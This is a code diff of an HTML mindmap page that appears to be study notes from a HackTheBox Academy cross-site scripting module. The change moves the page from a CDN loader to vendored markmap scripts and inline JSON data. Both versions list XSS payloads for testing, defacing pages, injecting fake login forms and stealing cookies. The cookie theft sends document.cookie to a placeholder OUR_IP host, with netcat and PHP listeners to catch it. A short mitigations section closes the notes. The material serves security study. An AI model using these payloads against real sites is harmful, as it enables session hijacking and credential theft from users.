@@ -4,88 +4,39 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Cross-Site Scripting (XSS) — Mindmap</title>
+<link rel="stylesheet" href="../../../vendor/markmap/markmap-toolbar.css" />
 <style>
   :root { color-scheme: light dark; }
   html, body { margin: 0; height: 100%; }
   body { background: #faf8f8; }
   @media (prefers-color-scheme: dark) { body { background: #1e1e21; } }
-  svg.markmap { width: 100%; height: 100vh; display: block; }
+  #mindmap { width: 100%; height: 100vh; display: block; }
+  .mm-toolbar { position: absolute; bottom: 0.75rem; right: 0.75rem; }
 </style>
-<script>
-  window.markmap = {
-    autoLoader: {
-      toolbar: true,
-      options: { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
-    },
-  }
-</script>
-<script async src="https://cdn.jsdelivr.net/npm/markmap-autoloader@0.18.12"></script>
+<script src="../../../vendor/markmap/d3.min.js"></script>
+<script src="../../../vendor/markmap/markmap-view.js"></script>
+<script src="../../../vendor/markmap/markmap-toolbar.js"></script>
 </head>
 <body>
-  <div class="markmap">
-    <script type="text/template">
-# Cross-Site Scripting (XSS)
-## 🎯 Main Idea
-- XSS lets an attacker inject malicious JavaScript that executes in a victim's browser in the context of a vulnerable web app.
-- Goal: understand the three XSS types, discover injection points, and weaponize them for defacement, phishing, and session hijacking.
-
-## 💥 Attack / Exploit Vectors
-### Stored (Persistent) XSS
-- Payload is saved on the server (e.g. a comment) and runs for every visitor.
-- **Commands**
-  - `<script>alert(window.origin)<\/script>` — basic test payload (confirms execution + origin)
-  - `<plaintext>` — basic test payload
-  - `<script>print()<\/script>` — payload that avoids alert-based filters
-  - `<img src="" onerror=alert(window.origin)>` — HTML/attribute-based payload when `<script>` is filtered
-### Reflected XSS
-- Non-persistent; payload reflected from the request (e.g. error message) back into the response.
-- **Commands**
-  - `<script>alert(window.origin)<\/script>` — reflected via a vulnerable GET/POST parameter
-### DOM-based XSS
-- Client-side JS writes attacker-controlled input (source) into a dangerous sink; never reaches the server.
-- **Commands**
-  - `#"><img src=/ onerror=alert(document.cookie)>` — payload via a DOM source (e.g. `document.write`, `innerHTML`, `location.hash`)
-- Key idea: trace Source (e.g. `document.URL`, `location`) to Sink (e.g. `innerHTML`, `eval`, `document.write`)
-### XSS Discovery
-- Find injectable parameters via automated scanners, manual testing, or source review.
-- **Commands**
-  - `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` — automated XSS discovery with XSStrike
-  - Manual: inject payloads into every input/parameter; Code review: inspect how input flows to output
-### Defacing
-- Use stored XSS to alter the page appearance for all visitors.
-- **Commands**
-  - `<script>document.body.style.background = "#141d2b"<\/script>` — change background colour
-  - `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"<\/script>` — change background image
-  - `<script>document.title = 'HackTheBox Academy'<\/script>` — change page title
-  - `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'<\/script>` — overwrite the page body
-  - `<script>document.getElementById('urlform').remove();<\/script>` — remove an HTML element
-### Phishing (Credential Stealing)
-- Inject a fake login form that posts credentials to an attacker-controlled server.
-- **Commands**
-  - `document.write('<fake login form>')` + `document.getElementById('urlform').remove();` — inject form and clean up original page
-  - `sudo php -S 0.0.0.0:80` — host a PHP page to capture submitted credentials
-  - `sudo nc -lvnp 80` — netcat listener to catch incoming data
-### Session Hijacking (Cookie Theft)
-- Steal victim session cookies via a remote script; useful for blind XSS.
-- **Commands**
-  - `<script src="http://OUR_IP/script.js"><\/script>` — load a remote attacker script (also used for blind XSS detection)
-  - `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie<\/script>` — exfiltrate cookies to our server
-  - `sudo nc -lvnp 80` — listener to receive stolen cookies
-  - `sudo php -S 0.0.0.0:80` — PHP server to log received cookies
-
-## 🛠️ Key Tools & Concepts
-- XSStrike — automated XSS discovery/fuzzing tool
-- netcat (`nc`) — listener for captured data/cookies
-- PHP built-in server (`php -S`) — host scripts / capture endpoints
-- Source & Sink — core DOM XSS analysis concept
-- Blind XSS — payload executes somewhere the attacker cannot see (detected via callbacks)
-- `document.cookie`, `window.origin` — key JS objects used in payloads
-
-## 🛡️ Mitigations
-- Front-end: validate input, use a Content Security Policy (CSP)
-- Back-end: context-aware output encoding/escaping, input validation and sanitization
-- Set HttpOnly flag on cookies to prevent JS access (mitigates cookie theft)
-    </script>
-  </div>
+  <svg id="mindmap"></svg>
+  <script>
+    const data = {"content":"Cross-Site Scripting (XSS)","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"XSS lets an attacker inject malicious JavaScript that executes in a victim&apos;s browser in the context of a vulnerable web app.","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Goal: understand the three XSS types, discover injection points, and weaponize them for defacement, phishing, and session hijacking.","children":[],"payload":{"tag":"li","lines":"3,5"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Stored (Persistent) XSS","children":[{"content":"Payload is saved on the server (e.g. a comment) and runs for every visitor.","children":[],"payload":{"tag":"li","lines":"7,8"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;script&gt;alert(window.origin)&lt;/script&gt;<\/code> &#x2014; basic test payload (confirms execution + origin)","children":[],"payload":{"tag":"li","lines":"9,10"}},{"content":"<code>&lt;plaintext&gt;<\/code> &#x2014; basic test payload","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"<code>&lt;script&gt;print()&lt;/script&gt;<\/code> &#x2014; payload that avoids alert-based filters","children":[],"payload":{"tag":"li","lines":"11,12"}},{"content":"<code>&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;<\/code> &#x2014; HTML/attribute-based payload when <code>&lt;script&gt;<\/code> is filtered","children":[],"payload":{"tag":"li","lines":"12,13"}}],"payload":{"tag":"li","lines":"8,13"}}],"payload":{"tag":"h3","lines":"6,7"}},{"content":"Reflected XSS","children":[{"content":"Non-persistent; payload reflected from the request (e.g. error message) back into the response.","children":[],"payload":{"tag":"li","lines":"14,15"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;script&gt;alert(window.origin)&lt;/script&gt;<\/code> &#x2014; reflected via a vulnerable GET/POST parameter","children":[],"payload":{"tag":"li","lines":"16,17"}}],"payload":{"tag":"li","lines":"15,17"}}],"payload":{"tag":"h3","lines":"13,14"}},{"content":"DOM-based XSS","children":[{"content":"Client-side JS writes attacker-controlled input (source) into a dangerous sink; never reaches the server.","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>#&quot;&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;<\/code> &#x2014; payload via a DOM source (e.g. <code>document.write<\/code>, <code>innerHTML<\/code>, <code>location.hash<\/code>)","children":[],"payload":{"tag":"li","lines":"20,21"}}],"payload":{"tag":"li","lines":"19,21"}},{"content":"Key idea: trace Source (e.g. <code>document.URL<\/code>, <code>location<\/code>) to Sink (e.g. <code>innerHTML<\/code>, <code>eval<\/code>, <code>document.write<\/code>)","children":[],"payload":{"tag":"li","lines":"21,22"}}],"payload":{"tag":"h3","lines":"17,18"}},{"content":"XSS Discovery","children":[{"content":"Find injectable parameters via automated scanners, manual testing, or source review.","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;<\/code> &#x2014; automated XSS discovery with XSStrike","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"Manual: inject payloads into every input/parameter; Code review: inspect how input flows to output","children":[],"payload":{"tag":"li","lines":"26,27"}}],"payload":{"tag":"li","lines":"24,27"}}],"payload":{"tag":"h3","lines":"22,23"}},{"content":"Defacing","children":[{"content":"Use stored XSS to alter the page appearance for all visitors.","children":[],"payload":{"tag":"li","lines":"28,29"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;<\/code> &#x2014; change background colour","children":[],"payload":{"tag":"li","lines":"30,31"}},{"content":"<code>&lt;script&gt;document.body.background = &quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;&lt;/script&gt;<\/code> &#x2014; change background image","children":[],"payload":{"tag":"li","lines":"31,32"}},{"content":"<code>&lt;script&gt;document.title = &apos;HackTheBox Academy&apos;&lt;/script&gt;<\/code> &#x2014; change page title","children":[],"payload":{"tag":"li","lines":"32,33"}},{"content":"<code>&lt;script&gt;document.getElementsByTagName(&apos;body&apos;)[0].innerHTML = &apos;text&apos;&lt;/script&gt;<\/code> &#x2014; overwrite the page body","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<code>&lt;script&gt;document.getElementById(&apos;urlform&apos;).remove();&lt;/script&gt;<\/code> &#x2014; remove an HTML element","children":[],"payload":{"tag":"li","lines":"34,35"}}],"payload":{"tag":"li","lines":"29,35"}}],"payload":{"tag":"h3","lines":"27,28"}},{"content":"Phishing (Credential Stealing)","children":[{"content":"Inject a fake login form that posts credentials to an attacker-controlled server.","children":[],"payload":{"tag":"li","lines":"36,37"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>document.write(&apos;&lt;fake login form&gt;&apos;)<\/code> + <code>document.getElementById(&apos;urlform&apos;).remove();<\/code> &#x2014; inject form and clean up original page","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"<code>sudo php -S 0.0.0.0:80<\/code> &#x2014; host a PHP page to capture submitted credentials","children":[],"payload":{"tag":"li","lines":"39,40"}},{"content":"<code>sudo nc -lvnp 80<\/code> &#x2014; netcat listener to catch incoming data","children":[],"payload":{"tag":"li","lines":"40,41"}}],"payload":{"tag":"li","lines":"37,41"}}],"payload":{"tag":"h3","lines":"35,36"}},{"content":"Session Hijacking (Cookie Theft)","children":[{"content":"Steal victim session cookies via a remote script; useful for blind XSS.","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;<\/code> &#x2014; load a remote attacker script (also used for blind XSS detection)","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"<code>&lt;script&gt;new Image().src=&apos;http://OUR_IP/index.php?c=&apos;+document.cookie&lt;/script&gt;<\/code> &#x2014; exfiltrate cookies to our server","children":[],"payload":{"tag":"li","lines":"45,46"}},{"content":"<code>sudo nc -lvnp 80<\/code> &#x2014; listener to receive stolen cookies","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"<code>sudo php -S 0.0.0.0:80<\/code> &#x2014; PHP server to log received cookies","children":[],"payload":{"tag":"li","lines":"47,49"}}],"payload":{"tag":"li","lines":"43,49"}}],"payload":{"tag":"h3","lines":"41,42"}}],"payload":{"tag":"h2","lines":"5,6"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"XSStrike &#x2014; automated XSS discovery/fuzzing tool","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"netcat (<code>nc<\/code>) &#x2014; listener for captured data/cookies","children":[],"payload":{"tag":"li","lines":"51,52"}},{"content":"PHP built-in server (<code>php -S<\/code>) &#x2014; host scripts / capture endpoints","children":[],"payload":{"tag":"li","lines":"52,53"}},{"content":"Source &amp; Sink &#x2014; core DOM XSS analysis concept","children":[],"payload":{"tag":"li","lines":"53,54"}},{"content":"Blind XSS &#x2014; payload executes somewhere the attacker cannot see (detected via callbacks)","children":[],"payload":{"tag":"li","lines":"54,55"}},{"content":"<code>document.cookie<\/code>, <code>window.origin<\/code> &#x2014; key JS objects used in payloads","children":[],"payload":{"tag":"li","lines":"55,57"}}],"payload":{"tag":"h2","lines":"49,50"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Front-end: validate input, use a Content Security Policy (CSP)","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"Back-end: context-aware output encoding/escaping, input validation and sanitization","children":[],"payload":{"tag":"li","lines":"59,60"}},{"content":"Set HttpOnly flag on cookies to prevent JS access (mitigates cookie theft)","children":[],"payload":{"tag":"li","lines":"60,61"}}],"payload":{"tag":"h2","lines":"57,58"}}],"payload":{"tag":"h1","lines":"0,1"}}
+    const { Markmap, Toolbar, globalCSS } = window.markmap
+    if (globalCSS) {
+      const s = document.createElement("style")
+      s.textContent = globalCSS
+      document.head.appendChild(s)
+    }
+    const mm = Markmap.create(
+      "#mindmap",
+      { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
+      data,
+    )
+    try {
+      const { el } = Toolbar.create(mm)
+      el.classList.add("mm-toolbar")
+      document.body.appendChild(el)
+    } catch (e) {}
+  </script>
 </body>
 </html>
